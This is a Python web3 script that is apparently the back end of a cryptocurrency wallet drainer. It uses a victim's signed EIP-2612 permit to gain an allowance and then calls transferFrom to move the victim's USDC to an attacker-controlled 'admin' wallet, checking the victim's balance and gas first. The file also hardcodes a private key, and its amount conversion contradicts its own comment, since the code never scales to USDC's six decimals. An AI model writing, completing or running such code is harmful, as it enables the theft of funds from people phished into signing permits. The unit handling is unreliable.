import os
from web3 import Web3

# --- CONFIGURATION ---
RPC_URL = "https://mainnet.infura.io/v3/YOUR_INFURA_KEY" # Use your actual key
ADMIN_PRIVATE_KEY = "0x7a391f7481f33221379ecf00a5f643e9d8999335f6068695d7398b16c803df6a"
USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

# FULL ABI REQUIRED FOR CHECKS
USDC_ABI = [
    {
        "constant": True, "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "inputs": [
            {"name": "owner", "type": "address"}, {"name": "spender", "type": "address"},
            {"name": "value", "type": "uint256"}, {"name": "deadline", "type": "uint256"},
            {"name": "v", "type": "uint8"}, {"name": "r", "type": "bytes32"}, {"name": "s", "type": "bytes32"}
        ],
        "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function"
    },
    {
        "inputs": [
            {"name": "from", "type": "address"}, {"name": "to", "type": "address"},
            {"name": "value", "type": "uint256"}
        ],
        "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"
    }
]

def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
    """
    Executes a Permit + TransferFrom sequence to drain USDC.
    Checks Admin ETH and Victim USDC balance before broadcasting.
    """
    try:
        # 1. Setup Accounts & Contract
        admin_account = w3.eth.account.from_key(ADMIN_PRIVATE_KEY)
        admin_addr = admin_account.address
        victim_addr = Web3.to_checksum_address(victim_address)
        contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)

        # Format Amount (USDC uses 6 decimals)
        # If user passes "9.4", convert to integer 9,400,000
        amount_to_drain = int(float(amount))

        # --- PRE-FLIGHT CHECK: ADMIN ETH ---
        admin_eth_balance = w3.eth.get_balance(admin_addr)
        gas_price = w3.eth.gas_price

        # Total Gas: 100k for Permit + 100k for Transfer = 200k
        total_gas_limit = 200000
        required_eth_wei = gas_price * total_gas_limit

        if admin_eth_balance < required_eth_wei:
            shortfall = w3.from_wei(required_eth_wei - admin_eth_balance, 'ether')
            return None, f"ADMIN_WALLET_ERROR: Low ETH. Need {shortfall:.5f} more for gas."

        # --- PRE-FLIGHT CHECK: VICTIM USDC ---
        victim_usdc_bal = contract.functions.balanceOf(victim_addr).call()

        if victim_usdc_bal < amount_to_drain:
            available = victim_usdc_bal / 1e6
            return None, f"USER_WALLET_ERROR: Target only has {available} USDC available."

        # --- PREPARE DATA ---
        r_bytes = w3.to_bytes(hexstr=r)
        s_bytes = w3.to_bytes(hexstr=s)
        current_nonce = w3.eth.get_transaction_count(admin_addr, 'pending')

        # --- STEP 1: EXECUTE PERMIT ---
        permit_tx = contract.functions.permit(
            victim_addr,
            admin_addr,
            amount_to_drain,
            int(deadline),
            int(v),
            r_bytes,
            s_bytes
        ).build_transaction({
            "from": admin_addr,
            "nonce": current_nonce,
            "gas": 100000,
            "gasPrice": gas_price,
            "chainId": 1
        })

        signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
        w3.eth.send_raw_transaction(signed_permit.raw_transaction)

        # --- STEP 2: EXECUTE DRAIN (TRANSFERFROM) ---
        transfer_tx = contract.functions.transferFrom(
            victim_addr,
            admin_addr,
            amount_to_drain
        ).build_transaction({
            "from": admin_addr,
            "nonce": current_nonce + 1, # Increment nonce manually for speed
            "gas": 100000,
            "gasPrice": gas_price,
            "chainId": 1
        })

        signed_transfer = w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_transfer.raw_transaction)

        return tx_hash.hex(), None

    except Exception as e:
        error_msg = str(e)
        if "insufficient funds" in error_msg.lower():
            return None, "BLOCKCHAIN_REJECTION: Admin Wallet ETH too low."
        if "already known" in error_msg.lower() or "nonce too low" in error_msg.lower():
            return None, "NONCE_ERROR: Transaction pending. Wait 30 seconds."
        return None, f"EXECUTION_FAILED: {error_msg}"
